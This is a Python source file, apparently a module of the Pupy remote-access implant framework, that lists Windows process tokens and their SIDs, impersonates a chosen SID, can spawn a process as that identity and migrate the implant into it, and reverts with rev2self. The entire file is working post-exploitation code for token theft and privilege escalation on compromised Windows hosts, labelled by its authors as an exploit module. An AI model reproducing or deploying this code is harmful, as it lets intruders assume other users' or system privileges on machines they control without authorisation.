# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo, obtain
from modules.lib.windows.migrate import migrate
import ctypes

__class_name__="ImpersonateModule"

@config(compat="windows", category="exploit")
class ImpersonateModule(PupyModule):
    """ list/impersonate process tokens """
    max_clients=1
    dependencies=["psutil", "pupwinutils.security"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="impersonate", description=self.__doc__)
        self.arg_parser.add_argument("-l", "--list", action='store_true', help="list available Sids")
        self.arg_parser.add_argument("-i", "--impersonate", metavar="SID", help="impersonate a sid")
        self.arg_parser.add_argument("-m", "--migrate", action="store_true", help="spawn a new process and migrate into it")
        self.arg_parser.add_argument("-r", "--rev2self", action='store_true', help="call rev2self")

    def run(self, args):
        if args.list:
            #with redirected_stdo(self.client.conn):
            l=obtain(self.client.conn.modules["pupwinutils.security"].ListSids())
            #self.log('\n'.join(["%s : %s"%x for x in l]))
            self.rawlog(self.formatter.table_format([{"pid": x[0], "process":x[1], "sid" : x[2], "username":x[3]} for x in l], wl=["pid", "process", "username", "sid"]))
        elif args.impersonate:
            if args.migrate:
                proc_pid=self.client.conn.modules["pupwinutils.security"].create_proc_as_sid(args.impersonate)
                migrate(self, proc_pid, keep=True)
            else:
                self.client.impersonated_dupHandle=self.client.conn.modules["pupwinutils.security"].impersonate_sid_long_handle(args.impersonate, close=False)
            self.success("Sid %s impersonated !"%args.impersonate)
        elif args.rev2self:
            self.client.conn.modules["pupwinutils.security"].rev2self()
            self.client.impersonated_dupHandle=None
            self.success("rev2self called")
        else:
            self.error("no option supplied")


